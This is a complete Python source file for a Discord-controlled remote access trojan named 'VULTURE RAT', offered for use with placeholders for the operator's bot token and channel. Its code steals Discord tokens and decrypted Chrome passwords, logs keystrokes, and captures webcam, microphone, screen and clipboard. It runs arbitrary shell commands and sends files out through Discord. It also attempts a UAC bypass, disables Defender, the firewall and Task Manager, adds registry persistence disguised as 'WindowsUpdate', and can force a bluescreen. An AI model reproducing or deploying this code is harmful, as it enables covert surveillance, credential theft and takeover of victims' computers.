# Fix for OpenCV in PyInstaller
import os
import sys

# Set OpenCV environment variable to find DLLs
if getattr(sys, 'frozen', False):
    os.environ['PATH'] = sys._MEIPASS + ";" + os.environ['PATH']

import discord
import subprocess
import os
import sys
import ctypes
import requests
import json
import base64
import sqlite3
import shutil
import glob
import winreg
import time
import threading
import cv2
import pyaudio
import wave
import psutil
import platform
import socket
import getpass
import ctypes.wintypes
import win32gui
import win32con
import pyautogui
import re
from discord.ext import commands
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Hash import SHA1
import win32crypt
from datetime import datetime, timedelta
from PIL import ImageGrab, Image
import ctypes
from ctypes import wintypes
import win32clipboard
import io

# CONFIG
TOKEN = "Your discord token"
CHANNEL_ID = 46372826266462727 #put your channel id here

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)

# FIX: Remove default help command so we can add our own
bot.remove_command('help')

current_path = os.environ['SYSTEMDRIVE'] + "\\"
keylog_active = False
keylog_file = os.environ['TEMP'] + "\\syslog.txt"
selected_cam = 0
critical_mode = False

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

# ========== DISCORD TOKEN GRABBER ==========
def grab_discord_tokens():
    tokens = []
    paths = [
        os.path.expanduser("~") + r"\AppData\Roaming\Discord\Local Storage\leveldb",
        os.path.expanduser("~") + r"\AppData\Roaming\DiscordPTB\Local Storage\leveldb",
        os.path.expanduser("~") + r"\AppData\Roaming\DiscordCanary\Local Storage\leveldb",
        os.path.expanduser("~") + r"\AppData\Roaming\Lightcord\Local Storage\leveldb",
        os.path.expanduser("~") + r"\AppData\Roaming\Opera Software\Opera Stable\Local Storage\leveldb"
    ]
    for path in paths:
        if os.path.exists(path):
            for file in os.listdir(path):
                if file.endswith(".log") or file.endswith(".ldb"):
                    with open(os.path.join(path, file), 'r', errors='ignore') as f:
                        data = f.read()
                        for match in re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', data):
                            if match not in tokens:
                                tokens.append(match)
                        for match in re.findall(r'mfa\.[\w-]{84}', data):
                            if match not in tokens:
                                tokens.append(match)
    return tokens

# ========== CHROME PASSWORDS ==========
def get_chrome_datetime(chromedate):
    if chromedate != 86400000000 and chromedate:
        try:
            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
        except:
            return chromedate
    return ""

def decrypt_chrome_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except:
        return "[FAILED]"

def get_chrome_master_key():
    local_state_path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Local State"
    if not os.path.exists(local_state_path):
        return None
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]
    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return master_key

def get_chrome_passwords():
    chrome_path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data"
    profiles = ["Default"]
    profile_dirs = glob.glob(chrome_path + "\\Profile *")
    for profile in profile_dirs:
        profiles.append(os.path.basename(profile))
    all_passwords = []
    master_key = get_chrome_master_key()
    if not master_key:
        return ["[ERROR] Chrome master key missing - run as admin"]
    for profile in profiles:
        login_db = os.path.join(chrome_path, profile, "Login Data")
        if not os.path.exists(login_db):
            continue
        temp_db = os.path.join(os.environ['TEMP'], f"chrome_{profile}_login.db")
        try:
            shutil.copy2(login_db, temp_db)
        except:
            continue
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value, date_created FROM logins WHERE password_value != ''")
            rows = cursor.fetchall()
            for row in rows:
                url, username, encrypted_pass, date_created = row
                if encrypted_pass:
                    try:
                        decrypted_pass = decrypt_chrome_password(encrypted_pass, master_key)
                        created = get_chrome_datetime(date_created)
                        all_passwords.append(f"🌐 Chrome - {profile}\nURL: {url}\nUser: {username}\nPass: {decrypted_pass}\nCreated: {created}\n{'-'*50}")
                    except:
                        all_passwords.append(f"🌐 Chrome - {profile}\nURL: {url}\nUser: {username}\nPass: [DECRYPT FAILED]\n{'-'*50}")
            conn.close()
        except Exception as e:
            all_passwords.append(f"[ERROR] {profile}: {str(e)}")
        finally:
            if os.path.exists(temp_db):
                os.remove(temp_db)
    return all_passwords if all_passwords else ["No Chrome passwords"]

# ========== WEBCAM ==========
def capture_webcam():
    cap = cv2.VideoCapture(selected_cam)
    if not cap.isOpened():
        return None
    ret, frame = cap.read()
    if ret:
        path = os.environ['TEMP'] + "\\webcam.jpg"
        cv2.imwrite(path, frame)
        cap.release()
        return path
    cap.release()
    return None

def get_cameras():
    cameras = []
    for i in range(5):
        cap = cv2.VideoCapture(i)
        if cap.isOpened():
            cameras.append(i)
            cap.release()
    return cameras

# ========== MIC RECORDING ==========
def record_mic(duration=10):
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 1
    RATE = 44100
    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
    frames = []
    for _ in range(0, int(RATE / CHUNK * duration)):
        data = stream.read(CHUNK)
        frames.append(data)
    stream.stop_stream()
    stream.close()
    p.terminate()
    path = os.environ['TEMP'] + "\\mic.wav"
    wf = wave.open(path, 'wb')
    wf.setnchannels(CHANNELS)
    wf.setsampwidth(p.get_sample_size(FORMAT))
    wf.setframerate(RATE)
    wf.writeframes(b''.join(frames))
    wf.close()
    return path

# ========== KEYLOGGER ==========
def start_keylog():
    global keylog_active
    keylog_active = True
    def on_press(event):
        if keylog_active:
            with open(keylog_file, 'a', encoding='utf-8') as f:
                if event.name == 'space':
                    f.write(' ')
                elif event.name == 'enter':
                    f.write('\n')
                elif event.name == 'backspace':
                    f.write('[BACKSPACE]')
                elif event.name == 'tab':
                    f.write('[TAB]')
                elif len(event.name) > 1:
                    f.write(f'[{event.name.upper()}]')
                else:
                    f.write(event.name)
    keyboard.on_press(on_press)
    keyboard.wait()

# ========== SYSTEM INFO ==========
def get_system_info():
    info = f"""** SYSTEM INFO **
PC Name: {os.environ['COMPUTERNAME']}
User: {os.environ['USERNAME']}
OS: {platform.system()} {platform.release()}
Arch: {platform.machine()}
CPU: {platform.processor()}
RAM: {round(psutil.virtual_memory().total / (1024**3))} GB
Admin: {is_admin()}
IP: {requests.get('https://api.ipify.org').text}
"""
    return info

# ========== MESSAGE BOX ==========
def show_message_box(text):
    ctypes.windll.user32.MessageBoxW(0, text, "Message", 0)

# ========== VOICE ==========
def speak(text):
    import win32com.client
    speaker = win32com.client.Dispatch("SAPI.SpVoice")
    speaker.Speak(text)

# ========== IDLE TIME ==========
def get_idle_time():
    class LASTINPUTINFO(ctypes.Structure):
        _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]
    lastInputInfo = LASTINPUTINFO()
    lastInputInfo.cbSize = ctypes.sizeof(LASTINPUTINFO)
    ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lastInputInfo))
    millis = ctypes.windll.kernel32.GetTickCount() - lastInputInfo.dwTime
    seconds = millis // 1000
    minutes = seconds // 60
    hours = minutes // 60
    return f"{hours}h {minutes%60}m {seconds%60}s"

# ========== BLOCK INPUT ==========
def block_input(block):
    ctypes.windll.user32.BlockInput(block)

# ========== CRITICAL PROCESS ==========
def make_critical():
    global critical_mode
    try:
        ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
        critical_mode = True
        return True
    except:
        return False

def unmake_critical():
    global critical_mode
    try:
        ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0)
        critical_mode = False
        return True
    except:
        return False

# ========== BLUESCREEN ==========
def bluescreen():
    if not is_admin():
        return False
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
    return True

# ========== ROOTKIT ==========
def hide_process():
    if not is_admin():
        return False
    try:
        ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")
        return True
    except:
        return False

# ========== WALLPAPER ==========
def set_wallpaper(image_path):
    ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 0)

# ========== CLIPBOARD ==========
def get_clipboard():
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        return data
    except:
        return "[NO TEXT IN CLIPBOARD]"

# ========== COMMANDS ==========

@bot.command()
async def message(ctx, *, text):
    if ctx.channel.id != CHANNEL_ID: return
    show_message_box(text)
    await ctx.send(f"✅ Message box shown: {text}")

@bot.command()
async def shell(ctx, *, command):
    if ctx.channel.id != CHANNEL_ID: return
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout if result.stdout else result.stderr
        if len(output) > 1900:
            with open("output.txt", "w") as f: f.write(output)
            await ctx.send(file=discord.File("output.txt"))
            os.remove("output.txt")
        else:
            await ctx.send(f"```{output}```")
    except Exception as e:
        await ctx.send(f"❌ {str(e)}")

@bot.command()
async def voice(ctx, *, text):
    if ctx.channel.id != CHANNEL_ID: return
    speak(text)
    await ctx.send(f"✅ Speaking: {text}")

@bot.command()
async def admincheck(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    await ctx.send(f"✅ Admin: {is_admin()}")

@bot.command()
async def cd(ctx, *, path=None):
    global current_path
    if ctx.channel.id != CHANNEL_ID: return
    if path:
        if os.path.isabs(path):
            new_path = path
        else:
            new_path = os.path.join(current_path, path)
        if os.path.exists(new_path) and os.path.isdir(new_path):
            current_path = new_path
            await ctx.send(f"✅ Changed to: {current_path}")
        else:
            await ctx.send(f"❌ Invalid path: {path}")
    else:
        await ctx.send(f"Current: {current_path}")

@bot.command()
async def dir(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    try:
        items = []
        for item in os.listdir(current_path):
            item_path = os.path.join(current_path, item)
            if os.path.isdir(item_path):
                items.append(f"📁 {item}")
            else:
                size = os.path.getsize(item_path)
                if size < 1024: size_str = f"{size} B"
                elif size < 1048576: size_str = f"{size/1024:.1f} KB"
                else: size_str = f"{size/1048576:.1f} MB"
                items.append(f"📄 {item} ({size_str})")
        if not items:
            await ctx.send("Empty directory")
            return
        chunk = f"**{current_path}**\n"
        for item in items:
            if len(chunk + item + "\n") > 1900:
                await ctx.send(chunk)
                chunk = item + "\n"
            else:
                chunk += item + "\n"
        await ctx.send(chunk)
    except Exception as e:
        await ctx.send(f"❌ {str(e)}")

@bot.command()
async def download(ctx, *, filepath):
    if ctx.channel.id != CHANNEL_ID: return
    if os.path.exists(filepath) and os.path.isfile(filepath):
        if os.path.getsize(filepath) > 104857600:
            await ctx.send("❌ File too large (>100MB)")
            return
        await ctx.send(file=discord.File(filepath))
    else:
        await ctx.send(f"❌ File not found: {filepath}")

@bot.command()
async def upload(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    if not ctx.message.attachments:
        await ctx.send("❌ Attach a file")
        return
    attachment = ctx.message.attachments[0]
    filepath = os.path.join(current_path, attachment.filename)
    await attachment.save(filepath)
    await ctx.send(f"✅ Saved to: {filepath}")

@bot.command()
async def uploadlink(ctx, url, filename):
    if ctx.channel.id != CHANNEL_ID: return
    try:
        r = requests.get(url)
        filepath = os.path.join(current_path, filename)
        with open(filepath, 'wb') as f:
            f.write(r.content)
        await ctx.send(f"✅ Downloaded from URL to: {filepath}")
    except Exception as e:
        await ctx.send(f"❌ {str(e)}")

@bot.command()
async def delete(ctx, *, filepath):
    if ctx.channel.id != CHANNEL_ID: return
    try:
        if os.path.exists(filepath):
            os.remove(filepath)
            await ctx.send(f"✅ Deleted: {filepath}")
        else:
            await ctx.send(f"❌ Not found: {filepath}")
    except Exception as e:
        await ctx.send(f"❌ {str(e)}")

@bot.command()
async def write(ctx, *, text):
    if ctx.channel.id != CHANNEL_ID: return
    pyautogui.write(text)
    await ctx.send(f"✅ Typed: {text}")

@bot.command()
async def wallpaper(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    if not ctx.message.attachments:
        await ctx.send("❌ Attach an image")
        return
    attachment = ctx.message.attachments[0]
    path = os.environ['TEMP'] + "\\wallpaper.jpg"
    await attachment.save(path)
    set_wallpaper(path)
    await ctx.send("✅ Wallpaper changed")

@bot.command()
async def clipboard(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    data = get_clipboard()
    await ctx.send(f"📋 Clipboard: ```{data}```")

@bot.command()
async def idletime(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    idle = get_idle_time()
    await ctx.send(f"🕐 Idle time: {idle}")

@bot.command()
async def currentdir(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    await ctx.send(f"📁 {current_path}")

@bot.command()
async def block(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    if not is_admin():
        await ctx.send("❌ Admin required")
        return
    block_input(True)
    await ctx.send("✅ Keyboard/mouse blocked")

@bot.command()
async def unblock(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    block_input(False)
    await ctx.send("✅ Keyboard/mouse unblocked")

@bot.command()
async def screenshot(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    try:
        screenshot = ImageGrab.grab()
        screenshot.save("screenshot.png")
        await ctx.send(file=discord.File("screenshot.png"))
        os.remove("screenshot.png")
    except Exception as e:
        await ctx.send(f"❌ {str(e)}")

@bot.command()
async def exit(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    await ctx.send(" Exiting...")
    sys.exit()

@bot.command()
async def kill(ctx, target):
    if ctx.channel.id != CHANNEL_ID: return
    if target.lower() == "all":
        await ctx.send(" Killing bot...")
        sys.exit()
    else:
        await ctx.send(f"❌ Use `!kill all`")

@bot.command()
async def uacbypass(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    try:
        subprocess.run('reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d "cmd.exe /c start cmd.exe" /f', shell=True)
        subprocess.run('reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /f', shell=True)
        subprocess.run('start computerdefaults.exe', shell=True)
        await ctx.send("✅ UAC bypass attempted - check for new admin cmd")
    except Exception as e:
        await ctx.send(f"❌ {str(e)}")

@bot.command()
async def shutdown(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    await ctx.send(" Shutting down...")
    os.system("shutdown /s /t 5")

@bot.command()
async def restart(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    await ctx.send(" Restarting...")
    os.system("shutdown /r /t 5")

@bot.command()
async def logoff(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    await ctx.send(" Logging off...")
    os.system("shutdown /l")

@bot.command()
async def bluescreen(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    if not is_admin():
        await ctx.send("❌ Admin required")
        return
    await ctx.send(" Triggering BSOD...")
    bluescreen()

@bot.command()
async def datetime(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    await ctx.send(f"📅 {now}")

@bot.command()
async def prockill(ctx, *, name):
    if ctx.channel.id != CHANNEL_ID: return
    try:
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() == name.lower():
                proc.kill()
                await ctx.send(f"✅ Killed {name}")
                return
        await ctx.send(f"❌ Process not found: {name}")
    except Exception as e:
        await ctx.send(f"❌ {str(e)}")

@bot.command()
async def disabledefender(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    if not is_admin():
        await ctx.send("❌ Admin required")
        return
    subprocess.run('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f', shell=True)
    subprocess.run('powershell Set-MpPreference -DisableRealtimeMonitoring $true', shell=True)
    await ctx.send("✅ Defender disabled (reboot may be needed)")

@bot.command()
async def disablefirewall(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    if not is_admin():
        await ctx.send("❌ Admin required")
        return
    subprocess.run('netsh advfirewall set allprofiles state off', shell=True)
    await ctx.send("✅ Firewall disabled")

@bot.command()
async def audio(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    if not ctx.message.attachments:
        await ctx.send("❌ Attach an audio file")
        return
    attachment = ctx.message.attachments[0]
    path = os.environ['TEMP'] + "\\audio.mp3"
    await attachment.save(path)
    os.startfile(path)
    await ctx.send(f"✅ Playing audio")

@bot.command()
async def critproc(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    if not is_admin():
        await ctx.send("❌ Admin required")
        return
    if make_critical():
        await ctx.send("✅ Process is now critical - closing will BSOD")
    else:
        await ctx.send("❌ Failed to make critical")

@bot.command()
async def uncritproc(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    if unmake_critical():
        await ctx.send("✅ Process no longer critical")
    else:
        await ctx.send("❌ Failed")

@bot.command()
async def website(ctx, *, url):
    if ctx.channel.id != CHANNEL_ID: return
    if not url.startswith("http"):
        url = "https://" + url
    os.startfile(url)
    await ctx.send(f"✅ Opened: {url}")

@bot.command()
async def disabletaskmgr(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    if not is_admin():
        await ctx.send("❌ Admin required")
        return
    subprocess.run('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f', shell=True)
    await ctx.send("✅ Task Manager disabled")

@bot.command()
async def enabletaskmgr(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    subprocess.run('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /f', shell=True)
    await ctx.send("✅ Task Manager enabled")

@bot.command()
async def startup(ctx, action=None):
    if ctx.channel.id != CHANNEL_ID: return
    try:
        if action and action.lower() == "add":
            script_path = os.path.abspath(sys.argv[0])
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, script_path)
            winreg.CloseKey(key)
            await ctx.send("✅ Added to startup")
        elif action and action.lower() == "remove":
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
                winreg.DeleteValue(key, "WindowsUpdate")
                winreg.CloseKey(key)
            except: pass
            await ctx.send("✅ Removed from startup")
        else:
            await ctx.send("Use `!startup add` or `!startup remove`")
    except Exception as e:
        await ctx.send(f"❌ {str(e)}")

@bot.command()
async def geolocate(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    try:
        ip = requests.get('https://api.ipify.org').text
        location = requests.get(f'http://ip-api.com/json/{ip}').json()
        lat = location.get('lat', 0)
        lon = location.get('lon', 0)
        maps_url = f"https://www.google.com/maps?q={lat},{lon}"
        await ctx.send(f"📍 IP: {ip}\nCity: {location.get('city', 'N/A')}\nCountry: {location.get('country', 'N/A')}\nMap: {maps_url}")
    except Exception as e:
        await ctx.send(f"❌ {str(e)}")

@bot.command()
async def listprocess(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    output = "**Processes:**\n"
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            output += f"{proc.info['pid']} - {proc.info['name']}\n"
            if len(output) > 1800:
                await ctx.send(f"```{output}```")
                output = ""
        except: pass
    if output:
        await ctx.send(f"```{output}```")

@bot.command()
async def password(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    await ctx.send("🔍 Dumping Chrome passwords...")
    chrome_passwords = get_chrome_passwords()
    if chrome_passwords and chrome_passwords != ["No Chrome passwords"]:
        output = "\n".join(chrome_passwords)
        if len(output) > 1900:
            with open("passwords.txt", "w", encoding='utf-8') as f:
                f.write(output)
            await ctx.send(file=discord.File("passwords.txt"))
            os.remove("passwords.txt")
        else:
            await ctx.send(f"```{output}```")
    else:
        await ctx.send("No passwords found")

@bot.command()
async def rootkit(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    if not is_admin():
        await ctx.send("❌ Admin required")
        return
    hide_process()
    await ctx.send("✅ Process hidden (taskmgr won't show it)")

@bot.command()
async def unrootkit(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    ctypes.windll.kernel32.SetConsoleTitleW("")
    await ctx.send("✅ Process visible again")

@bot.command()
async def getcams(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    cams = get_cameras()
    if cams:
        await ctx.send(f"📷 Available cameras: {cams}\nUse `!selectcam <number>`")
    else:
        await ctx.send("❌ No cameras found")

@bot.command()
async def selectcam(ctx, num):
    global selected_cam
    if ctx.channel.id != CHANNEL_ID: return
    try:
        cam_num = int(num)
        cap = cv2.VideoCapture(cam_num)
        if cap.isOpened():
            selected_cam = cam_num
            cap.release()
            await ctx.send(f"✅ Camera {cam_num} selected")
        else:
            await ctx.send(f"❌ Camera {cam_num} not available")
    except:
        await ctx.send("❌ Invalid number")

@bot.command()
async def webcampic(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    await ctx.send("📸 Capturing...")
    img_path = capture_webcam()
    if img_path and os.path.exists(img_path):
        await ctx.send(file=discord.File(img_path))
        os.remove(img_path)
    else:
        await ctx.send("❌ Webcam failed")

@bot.command()
async def grabtokens(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    await ctx.send("🔍 Grabbing Discord tokens...")
    tokens = grab_discord_tokens()
    if tokens:
        output = "\n".join(tokens)
        if len(output) > 1900:
            with open("tokens.txt", "w") as f:
                f.write(output)
            await ctx.send(file=discord.File("tokens.txt"))
            os.remove("tokens.txt")
        else:
            await ctx.send(f"```{output}```")
    else:
        await ctx.send("No tokens found")

# FIXED HELP COMMAND (renamed from 'help' to 'commands' to avoid conflict)
@bot.command()
async def commands(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    help_text = """** VULTURE RAT COMMANDS **

[!] CORE COMMANDS
!message <text>     - Show message box
!shell <cmd>        - Execute shell command  
!voice <text>       - Text to speech
!admincheck         - Check admin status
!sysinfo            - System information
!publicip           - Public IP address

[!] FILE SYSTEM
!cd <path>          - Change directory
!dir                - List directory
!currentdir         - Show current path
!download <file>    - Download file
!upload             - Upload file (with attachment)
!uploadlink <url>   - Download from URL
!delete <file>      - Delete file
!write <text>       - Type text

[!] SURVEILLANCE
!screenshot         - Take screenshot
!webcampic          - Capture webcam photo
!getcams            - List cameras
!selectcam <num>    - Select camera
!mic <seconds>      - Record microphone
!keylog start/stop/dump - Keylogger
!clipboard          - Get clipboard content

[!] SYSTEM CONTROL
!shutdown           - Shutdown PC
!restart            - Restart PC
!logoff             - Log off user
!bluescreen         - BSOD (admin)
!block              - Block input (admin)
!unblock            - Unblock input
!disabletaskmgr     - Disable Task Manager
!enabletaskmgr      - Enable Task Manager
!prockill <name>    - Kill process
!listprocess        - List all processes

[!] SECURITY
!password           - Dump Chrome passwords
!grabtokens         - Grab Discord tokens
!disabledefender    - Disable Defender (admin)
!disablefirewall    - Disable Firewall (admin)

[!] PERSISTENCE
!startup add/remove - Add to startup
!rootkit            - Hide process (admin)
!unrootkit          - Unhide process
!critproc           - Make process critical
!uncritproc         - Remove critical

[!] OTHER
!website <url>      - Open website
!audio              - Play audio file
!wallpaper          - Change wallpaper
!datetime           - Show date/time
!idletime           - User idle time
!geolocate          - IP geolocation
!uacbypass          - Attempt UAC bypass
!exit               - Kill bot

[!] = Requires admin | <required> | optional
============================================="""
    
    # Split into chunks if too long
    for chunk in [help_text[i:i+1900] for i in range(0, len(help_text), 1900)]:
        await ctx.send(f"```{chunk}```")

@bot.command()
async def keylog(ctx, action=None):
    global keylog_active
    if ctx.channel.id != CHANNEL_ID: return
    if action and action.lower() == "start":
        if keylog_active:
            await ctx.send("⚠️ Already running")
            return
        thread = threading.Thread(target=start_keylog, daemon=True)
        thread.start()
        await ctx.send("✅ Keylogger started")
    elif action and action.lower() == "stop":
        keylog_active = False
        await ctx.send("✅ Keylogger stopped")
    elif action and action.lower() == "dump":
        if os.path.exists(keylog_file):
            with open(keylog_file, 'r', encoding='utf-8') as f:
                logs = f.read()
            if len(logs) > 1900:
                await ctx.send(file=discord.File(keylog_file))
            else:
                await ctx.send(f"```{logs}```")
            os.remove(keylog_file)
        else:
            await ctx.send("❌ No logs")
    else:
        await ctx.send("Usage: `!keylog start/stop/dump`")

@bot.command()
async def mic(ctx, duration=10):
    if ctx.channel.id != CHANNEL_ID: return
    if duration > 60: duration = 60
    await ctx.send(f"🎤 Recording {duration}s...")
    audio_path = record_mic(duration)
    if audio_path and os.path.exists(audio_path):
        await ctx.send(file=discord.File(audio_path))
        os.remove(audio_path)
    else:
        await ctx.send("❌ Failed")

@bot.command()
async def persistence(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    script_path = os.path.abspath(sys.argv[0])
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, script_path)
        winreg.CloseKey(key)
        await ctx.send("✅ Persistence installed (Registry)")
    except:
        await ctx.send("❌ Persistence failed")

@bot.command()
async def killswitch(ctx):
    global keylog_active
    if ctx.channel.id != CHANNEL_ID: return
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, "WindowsUpdate")
        winreg.CloseKey(key)
    except: pass
    keylog_active = False
    if os.path.exists(keylog_file): os.remove(keylog_file)
    await ctx.send("✅ Killswitch - traces removed, exiting")
    sys.exit()

@bot.command()
async def sysinfo(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    info = get_system_info()
    await ctx.send(info)

@bot.command()
async def publicip(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    try:
        ip = requests.get('https://api.ipify.org').text
        await ctx.send(f"🌐 Public IP: {ip}")
    except Exception as e:
        await ctx.send(f"❌ {str(e)}")

@bot.command()
async def files(ctx, *, path=None):
    global current_path
    if ctx.channel.id != CHANNEL_ID: return
    if path and path.startswith("download "):
        filename = path[9:].strip()
        filepath = os.path.join(current_path, filename)
        if os.path.exists(filepath) and os.path.isfile(filepath):
            if os.path.getsize(filepath) > 104857600:
                await ctx.send("❌ Too large")
                return
            await ctx.send(file=discord.File(filepath))
        else:
            await ctx.send(f"❌ Not found")
        return
    if path and path == "back":
        parent = os.path.dirname(current_path)
        if parent and parent != current_path:
            current_path = parent
        else:
            await ctx.send("❌ Already at root")
            return
    elif path:
        test_path = path if os.path.isabs(path) else os.path.join(current_path, path)
        if os.path.exists(test_path) and os.path.isdir(test_path):
            current_path = test_path
        else:
            await ctx.send(f"❌ Invalid path")
            return
    try:
        items = []
        if current_path != current_path[:3]:
            items.append("📁 [..]")
        for item in os.listdir(current_path):
            item_path = os.path.join(current_path, item)
            if os.path.isdir(item_path):
                items.append(f"📁 {item}")
            else:
                size = os.path.getsize(item_path)
                if size < 1024: size_str = f"{size} B"
                elif size < 1048576: size_str = f"{size/1024:.1f} KB"
                else: size_str = f"{size/1048576:.1f} MB"
                items.append(f"📄 {item} ({size_str})")
        output = f"**{current_path}**\n" + "\n".join(items)
        if len(output) > 1900:
            for chunk in [output[i:i+1900] for i in range(0, len(output), 1900)]:
                await ctx.send(chunk)
        else:
            await ctx.send(output)
    except Exception as e:
        await ctx.send(f"❌ {str(e)}")

@bot.event
async def on_ready():
    print(f'{bot.user} online')
    channel = bot.get_channel(CHANNEL_ID)
    if channel:
        admin_status = "✅ ADMIN" if is_admin() else "❌ NOT ADMIN"
        await channel.send(f"**[ VULTURE RAT ACTIVE ]**\nAdmin: {admin_status}\nPC: {os.environ['COMPUTERNAME']}\nUser: {os.environ['USERNAME']}")

bot.run(TOKEN)